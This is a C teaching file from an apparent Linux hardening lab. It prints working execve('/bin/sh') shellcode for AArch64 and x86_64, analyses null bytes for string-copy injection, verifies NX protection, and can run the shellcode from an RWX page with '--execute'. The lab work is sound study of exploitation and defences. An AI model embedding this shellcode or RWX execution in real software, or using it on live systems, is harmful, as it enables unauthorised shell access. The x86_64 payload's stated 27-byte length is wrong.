/**
 * Linux Kernel Hardening Lab - Principles Track 3: Shellcode Architecture & Engineering
 * labs/principles/04-shellcode/shellcode_tester.c
 *
 * Demonstrates:
 * 1. Machine opcode breakdown of execve("/bin/sh") payload.
 * 2. Why null-byte (\x00) elimination is necessary for string-copy vulnerabilities.
 * 3. Position-independent execution using mmap(PROT_READ|PROT_WRITE|PROT_EXEC).
 * 4. Dual-architecture support (AArch64 as default, x86_64 side-by-side).
 * 5. Memory page permission inspection via /proc/self/maps (W^X / NX validation).
 * 6. Classical JMP-CALL-POP (Trampoline) vs Modern PC-relative / Stack-push comparison.
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <signal.h>
#include <setjmp.h>
#include <sys/mman.h>

/*
 * AArch64 (ARM64) execve("/bin/sh", NULL, NULL) Shellcode (28 bytes) [DEFAULT]
 *
 * Assembly breakdown:
 *   a0 00 00 10             adr    x0, #20              ; X0 = PC-relative pointer to "/bin/sh" string
 *   e1 03 1f aa             mov    x1, xzr              ; X1 = NULL argv (using zero register xzr)
 *   e2 03 1f aa             mov    x2, xzr              ; X2 = NULL envp (using zero register xzr)
 *   a8 1b 80 d2             mov    x8, #0xdd            ; X8 = 221 (__NR_execve on Linux AArch64)
 *   01 00 00 d4             svc    #0                   ; Supervisor Call (transition to EL1 kernel)
 *   2f 62 69 6e 2f 73 68 00 .string "/bin/sh"           ; Embedded null-terminated string (8 bytes)
 */
static const unsigned char arm64_shellcode[] = {
    0xa0, 0x00, 0x00, 0x10, /* adr x0, #20 -> points to "/bin/sh" */
    0xe1, 0x03, 0x1f, 0xaa, /* mov x1, xzr */
    0xe2, 0x03, 0x1f, 0xaa, /* mov x2, xzr */
    0xa8, 0x1b, 0x80, 0xd2, /* mov x8, #0xdd (221: __NR_execve) */
    0x01, 0x00, 0x00, 0xd4, /* svc #0 */
    0x2f, 0x62, 0x69, 0x6e, /* "/bin" */
    0x2f, 0x73, 0x68, 0x00  /* "/sh\0" */
};

/*
 * x86_64 execve("/bin/sh", NULL, NULL) Null-Free Shellcode (27 bytes)
 *
 * Assembly breakdown:
 *   31 c0                   xor    %eax, %eax           ; EAX = 0 (Null terminator without \x00 opcode)
 *   48 bb 2f 62 69 6e 2f    movabs $0x68732f2f6e69622f, %rbx ; RBX = "/bin//sh" (8 bytes, little-endian)
 *   2f 73 68
 *   53                      push   %rbx                 ; Push "/bin//sh" to stack
 *   48 89 e7                mov    %rsp, %rdi           ; RDI = Pointer to "/bin//sh" (arg1: filename)
 *   50                      push   %rax                 ; Push NULL terminator
 *   48 89 e2                mov    %rsp, %rdx           ; RDX = NULL envp (arg3: envp)
 *   57                      push   %rdi                 ; Push pointer to "/bin//sh"
 *   48 89 e6                mov    %rsp, %rsi           ; RSI = argv ["/bin//sh", NULL] (arg2: argv)
 *   b0 3b                   mov    $0x3b, %al           ; AL = 59 (__NR_execve in 8-bit subregister)
 *   0f 05                   syscall                     ; Fast System Call (Ring 0 kernel entry)
 */
static const unsigned char x86_64_shellcode[] = {
    0x31, 0xc0,
    0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x73, 0x68,
    0x53,
    0x48, 0x89, 0xe7,
    0x50,
    0x48, 0x89, 0xe2,
    0x57,
    0x48, 0x89, 0xe6,
    0xb0, 0x3b,
    0x0f, 0x05
};

/* Sigjmp buffer for NX fault catching */
static sigjmp_buf nx_jump_buf;

static void segv_handler(int sig)
{
    (void)sig;
    siglongjmp(nx_jump_buf, 1);
}

void print_memory_map_entry(const char *label, const void *addr)
{
    FILE *fp = fopen("/proc/self/maps", "r");
    if (!fp) {
        printf("  [-] Could not open /proc/self/maps\n");
        return;
    }

    uintptr_t target = (uintptr_t)addr;
    char line[512];
    int found = 0;

    while (fgets(line, sizeof(line), fp)) {
        uintptr_t start = 0, end = 0;
        char perms[8] = {0};
        if (sscanf(line, "%lx-%lx %4s", &start, &end, perms) >= 3) {
            if (target >= start && target < end) {
                line[strcspn(line, "\r\n")] = '\0';
                printf("  [★] %-18s [%p]: %s\n", label, addr, line);
                found = 1;
                break;
            }
        }
    }
    if (!found) {
        printf("  [?] %-18s [%p]: Region not mapped in /proc/self/maps\n", label, addr);
    }
    fclose(fp);
}

void inspect_shellcode(const unsigned char *code, size_t len, const char *arch_name)
{
    printf("\n============================================================\n");
    printf(" Shellcode Inspection [%s] (Total Length: %zu bytes)\n", arch_name, len);
    printf("============================================================\n");

    int null_bytes = 0;
    printf("[Hex Dump]\n  ");
    for (size_t i = 0; i < len; i++) {
        printf("\\x%02x", code[i]);
        if (code[i] == 0x00) {
            null_bytes++;
        }
        if ((i + 1) % 12 == 0 && i + 1 < len) {
            printf("\n  ");
        }
    }
    printf("\n\n");

    printf("[Engineering Analysis]\n");
    if (null_bytes == 0) {
        printf("  [+] Null-Byte Check: PASSED (0 null bytes detected).\n");
        printf("      Safe for injection into string-copy functions (strcpy, gets, sprintf).\n");
    } else {
        printf("  [-] Null-Byte Check: %d null byte(s) detected.\n", null_bytes);
        printf("      Requires byte-stream injection (read, recv, socket) or decoder stub.\n");
    }
    printf("============================================================\n");
}

void print_architecture_comparison(void)
{
    printf("\n------------------------------------------------------------\n");
    printf(" [Architectural Comparison: Syscall & Addressing Evolution]\n");
    printf("------------------------------------------------------------\n");
    printf(" 1. Syscall Entry Instruction:\n");
    printf("    - Legacy x86 (32-bit): 'int $0x80'  (Software interrupt via IDT)\n");
    printf("    - AMD/Intel x86_64   : 'syscall'    (MSR LSTAR direct fast jump)\n");
    printf("    - ARM / AArch64      : 'svc #0'     (Supervisor Call to EL1)\n\n");

    printf(" 2. String Address Resolution (Position-Independent Code / PIC):\n");
    printf("    - Legacy x86 JMP-CALL-POP (Trampoline):\n");
    printf("      * JMP to CALL -> CALL pushes next address onto stack -> POP into ESI.\n");
    printf("    - Modern AArch64 (ARM64):\n");
    printf("      * 'adr x0, #offset' directly loads PC-relative string address.\n");
    printf("    - Modern x86_64:\n");
    printf("      * 'movabs $0x68732f2f6e69622f, %%rbx; push %%rbx' pushes inline string.\n");
    printf("------------------------------------------------------------\n");
}

void test_nx_enforcement(const unsigned char *code, size_t len)
{
    printf("\n=== [W^X / NX (No-Execute) Protection Verification] ===\n");
    printf("[*] Allocating PROT_READ | PROT_WRITE memory page (NX active, no PROT_EXEC)...\n");

    void *non_exec_mem = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                              MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (non_exec_mem == MAP_FAILED) {
        perror("[-] mmap failed");
        return;
    }

    memcpy(non_exec_mem, code, len);
    print_memory_map_entry("NX Buffer (rw-p)", non_exec_mem);

    struct sigaction sa, old_sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = segv_handler;
    sigaction(SIGSEGV, &sa, &old_sa);

    printf("[*] Attempting to jump to non-executable memory at %p...\n", non_exec_mem);

    if (sigsetjmp(nx_jump_buf, 1) == 0) {
        void (*bad_fn)(void) = (void (*)(void))non_exec_mem;
        bad_fn();
        printf("[-] FAILED: Code executed in non-executable memory (NX disabled)!\n");
    } else {
        printf("\n============================================================\n");
        printf(" [★] SUCCESS: SIGSEGV Caught! NX / W^X Protection Verified!\n");
        printf("     CPU hardware page table NX bit blocked code execution.\n");
        printf("============================================================\n");
    }

    sigaction(SIGSEGV, &old_sa, NULL);
    munmap(non_exec_mem, 4096);
}

int main(int argc, char *argv[])
{
    printf("=== Linux Kernel Hardening Lab - Shellcode Engineering ===\n");

    /* Default: AArch64 inspected first, x86_64 inspected side-by-side */
    inspect_shellcode(arm64_shellcode, sizeof(arm64_shellcode), "AArch64 (Default)");
    inspect_shellcode(x86_64_shellcode, sizeof(x86_64_shellcode), "x86_64 (Comparative)");
    print_architecture_comparison();

    /* Memory map inspection for runtime process segments */
    int stack_var = 42;
    void *heap_var = malloc(16);
    printf("\n=== [Process Memory Map Protection (/proc/self/maps)] ===\n");
    print_memory_map_entry("Process Stack", &stack_var);
    print_memory_map_entry("Process Heap", heap_var);
    print_memory_map_entry("Main Function (.text)", (void *)main);
    free(heap_var);

#if defined(__aarch64__)
    const unsigned char *target_code = arm64_shellcode;
    size_t code_len = sizeof(arm64_shellcode);
    const char *target_arch_name = "AArch64";
#elif defined(__x86_64__)
    const unsigned char *target_code = x86_64_shellcode;
    size_t code_len = sizeof(x86_64_shellcode);
    const char *target_arch_name = "x86_64";
#else
    const unsigned char *target_code = NULL;
    size_t code_len = 0;
    const char *target_arch_name = "Unknown";
#endif

    if (argc > 1 && strcmp(argv[1], "--test-nx") == 0) {
        test_nx_enforcement(target_code, code_len);
    } else if (argc > 1 && strcmp(argv[1], "--execute") == 0) {
        printf("\n[!] WARNING: Executing %s shellcode into active shell (execve /bin/sh)...\n", target_arch_name);
        printf("[!] If successful, you will enter a new shell session. Type 'exit' to return.\n\n");

        /* Allocate RWX memory page to simulate vulnerable non-NX environment */
        void *exec_mem = mmap(NULL, 4096, PROT_READ | PROT_WRITE | PROT_EXEC,
                              MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (exec_mem == MAP_FAILED) {
            perror("[-] mmap failed");
            return 1;
        }

        print_memory_map_entry("RWX Shellcode Page", exec_mem);
        memcpy(exec_mem, target_code, code_len);
        void (*shell_fn)(void) = (void (*)(void))exec_mem;

        /* Jump to shellcode */
        shell_fn();
    } else {
        printf("\n[i] Usage options:\n");
        printf("    './shellcode_tester'            : Inspect opcodes & memory protections\n");
        printf("    './shellcode_tester --test-nx'  : Verify hardware W^X / NX SIGSEGV enforcement\n");
        printf("    './shellcode_tester --execute'  : Execute shellcode via RWX page\n");
    }

    return 0;
}
